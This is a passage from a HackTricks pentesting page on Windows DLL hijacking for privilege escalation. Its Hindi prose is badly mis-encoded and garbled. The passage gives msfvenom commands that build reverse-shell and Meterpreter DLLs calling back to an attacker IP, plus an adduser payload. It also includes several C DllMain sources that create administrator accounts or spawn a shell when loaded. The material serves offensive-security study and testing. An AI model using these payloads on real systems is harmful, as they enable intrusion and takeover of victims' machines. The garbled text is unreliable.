рдЖрдк рдПрдХ executable рдХреЗ imports рдФрд░ рдПрдХ dll рдХреЗ exports рдХреА рдЬрд╛рдБрдЪ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **Dll Hijacking рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ** рдХреЗ рд▓рд┐рдП рдкреВрд░реНрдг рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕рд┐рд╕реНрдЯрдо PATH рдХреЗ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВред\
рдЗрд╕ рд╡рдВрд╢рд╡рд╛рдж рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рджрд┐рд▓рдЪрд╕реНрдк рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг рд╣реИрдВ **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ рдФрд░ _Write-HijackDll._

### рдЙрджрд╛рд╣рд░рдг

рдпрджрд┐ рдЖрдк рдПрдХ рдЙрддреНрдкрд╛рджрдиреАрдп рд╕реНрдерд┐рддрд┐ рдХреЛ рдЙрддреНрдкрд╛рджрдиреАрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рддрдХ рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрддреНрдкрд╛рджрдиреАрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╕реЗ рдЙрдЪреНрдЪ **(UAC рдХреЛ рдЫрд▓рдХрд░)** рдпрд╛ **рдЙрдЪреНрдЪ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░** рдХреЗ рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдвреВрдВрдврддреЗ рд╣реИрдВ, рддреЛ рдЙрд╕реЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЪреАрдЬреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реЛрдЧрд╛ **рдХрдо рд╕реЗ рдХрдо рд╕рднреА рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ dll рдмрдирд╛рдирд╛ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдЗрд╕рд╕реЗ рдЖрдпрд╛рдд рдХрд░реЗрдЧрд╛**ред рдлрд┐рд░ рднреА, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Dll Hijacking рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ [рдорд╛рдзреНрдпрдо рдЕрднрд┐рдХрд░рдг рд╕реНрддрд░ рд╕реЗ рдЙрдЪреНрдЪ **(UAC рдХреЛ рдЫрд▓рдХрд░)**](../../authentication-credentials-uac-and-efs/#uac) рдпрд╛ **рдЙрдЪреНрдЪ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо**]\(./#from-high-integrity-to-system)\*\* рддрдХ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░\*\*ред рдЖрдк рдПрдХ рдорд╛рдиреНрдп dll рдмрдирд╛рдиреЗ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЗрд╕ dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдЕрдзреНрдпрдпрди рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИ dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **рдЕрдЧрд▓реЗ рдЦрдВрдб** рдореЗрдВ рдЖрдкрдХреЛ рдХреБрдЫ **рдореВрд▓ dll рдХреЛрдб** рдорд┐рд▓реЗрдВрдЧреЗ рдЬреЛ **рдирдореВрдиреЗ** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **рдПрдХ dll рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП** рдЬрд┐рд╕рдореЗрдВ **рдЕрдирд╛рд╡рд╢реНрдпрдХ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

## **Dlls рдмрдирд╛рдирд╛ рдФрд░ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛**

### **Dll Proxifying**

рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ **Dll рдкреНрд░реЙрдХреНрд╕реА** рдПрдХ рдРрд╕рд╛ Dll рд╣реИ рдЬреЛ **рдЬрдм рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЖрдкрдХреЗ рджреБрд░рд╛рдЪрд╛рд░реА рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ** рд▓реЗрдХрд┐рди рдпрд╣ рднреА **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рд╕рднреА рдХреЙрд▓ рдХреЛ рд░реАрд▓ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдХреЗ рдЙрджреНрджреЗрд╢реНрдпрдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рд╣реИред

рдЙрдкрдХрд░рдг [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) рдпрд╛ [**Spartacus**](https://github.com/Accenture/Spartacus) рдЖрдк рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдФрд░ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдкреНрд░реЙрдХреНрд╕реА рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░реЙрдХреНрд╕реАрдлрд╛рдЗрдб dll рдЙрддреНрдкрдиреНрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **Dll рдХреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░реЗрдВ** рдФрд░ **рдкреНрд░реЙрдХреНрд╕реАрдлрд╛рдЗрдб dll рдЙрддреНрдкрдиреНрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### **Meterpreter**

**рдЧреЗрдЯ рд░реЗрд╡ рд╢реИрд▓ (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**рдореАрдЯрд░рдкреНрд░реЗрдЯрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ (x86 рдореЗрдВ рдореИрдВрдиреЗ x64 рд╕рдВрд╕реНрдХрд░рдг рдирд╣реАрдВ рджреЗрдЦрд╛):**

```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### рдЕрдкрдирд╛

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд╡рд╣ Dll рдЬрд┐рд╕реЗ рдЖрдк рдХрдВрдкрд╛рдЗрд▓ рдХрд░рддреЗ рд╣реИрдВ, **рдХрдИ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП** рдЬреЛ рдкреАрдбрд╝рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ, рдпрджрд┐ рдпреЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИрдВ рддреЛ **рдмрд╛рдЗрдирд░реА рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдЧрд╛** рдФрд░ **рдЙрддреНрдкреАрдбрд╝рди рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛**ред

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```

## рд╕рдВрджрд░реНрдн

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ** **Intigriti** рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдЖрдЬ рд╣реА, рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдХрдорд╛рдИ рддрдХ **$100,000** рддрдХ рдХреЗ рдмрд╛рдЙрдВрдЯреА!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
